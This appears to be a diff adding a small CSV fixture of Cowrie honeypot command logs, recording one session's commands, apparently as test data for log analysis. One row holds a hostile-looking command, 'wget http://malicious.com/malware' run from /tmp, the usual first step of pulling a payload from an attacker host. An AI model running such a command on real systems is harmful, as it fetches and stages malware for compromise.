@@ -1,0 +1,5 @@
+eventid,timestamp,session,src_ip,input
+cowrie.command.input,2023-02-23 21:46:00,session123,192.168.1.1,ls
+cowrie.command.input,2023-02-23 21:46:05,session123,192.168.1.1,cd /tmp
+cowrie.command.input,2023-02-23 21:46:10,session123,192.168.1.1,wget http://malicious.com/malware
+
